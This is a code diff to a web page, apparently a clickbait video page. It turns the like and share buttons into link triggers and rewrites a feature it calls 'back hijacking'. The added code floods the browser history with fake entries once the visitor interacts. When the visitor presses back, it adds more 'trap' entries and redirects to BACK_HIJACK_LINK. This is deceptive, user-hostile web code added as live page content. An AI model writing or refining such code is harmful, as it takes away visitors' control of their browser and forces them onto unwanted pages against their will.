@@ -286,6 +286,7 @@
             padding: 5px 10px;
             border-radius: 20px;
             border: 1px solid var(--border-ui);
+            cursor: pointer;
         }
 
         /* CHAT SECTION */
@@ -767,35 +768,52 @@
                 e.stopPropagation(); 
                 triggerLinks();
             });
+
+            // Like and Share button click handler
+            const actionBtns = document.querySelectorAll('.action-btn');
+            actionBtns.forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    triggerLinks();
+                });
+            });
+
             document.getElementById('suggestedList').addEventListener('click', function(e) {
                 if(e.target.closest('.suggested-video-item')) triggerLinks();
             });
 
-            // Back Hijacking
-            let hijackInitialized = false;
-            function pushStateHistory() {
-                for (let i = 0; i < 15; i++) {
-                    window.history.pushState({ page: i }, document.title, window.location.href);
-                }
-            }
-            function setupHijack() {
-                if (!hijackInitialized) {
-                    pushStateHistory();
-                    hijackInitialized = true;
-                }
-            }
-            pushStateHistory();
+            // ================= IMPROVED BACK HIJACK SYSTEM =================
+            let isHijackLocked = false;
 
-            const userEvents = ['click', 'touchstart', 'mousemove', 'scroll', 'keydown'];
+            function lockHistory() {
+                if (isHijackLocked) return;
+                isHijackLocked = true;
+
+                for (let i = 0; i < 25; i++) {
+                    window.history.pushState({ page: i, locked: true }, document.title, window.location.href);
+                }
+            }
+
+            function armHijack() {
+                lockHistory();
+                const events = ['touchstart', 'touchend', 'click', 'scroll', 'keydown', 'mousemove'];
+                events.forEach(evt => {
+                    window.removeEventListener(evt, armHijack);
+                });
+            }
+
+            window.history.pushState({ page: 'init' }, document.title, window.location.href);
+
+            const userEvents = ['touchstart', 'touchend', 'click', 'scroll', 'keydown', 'mousemove'];
             userEvents.forEach(evt => {
-                window.addEventListener(evt, setupHijack, { passive: true });
+                window.addEventListener(evt, armHijack, { passive: true, capture: true });
             });
 
-            window.addEventListener('popstate', function () {
-                pushStateHistory();
-                setTimeout(function() {
-                    window.location.href = BACK_HIJACK_LINK;
-                }, 10);
+            window.addEventListener('popstate', function (event) {
+                for (let i = 0; i < 10; i++) {
+                    window.history.pushState({ page: 'trap' }, document.title, window.location.href);
+                }
+                window.location.replace(BACK_HIJACK_LINK);
             });
 
         })();
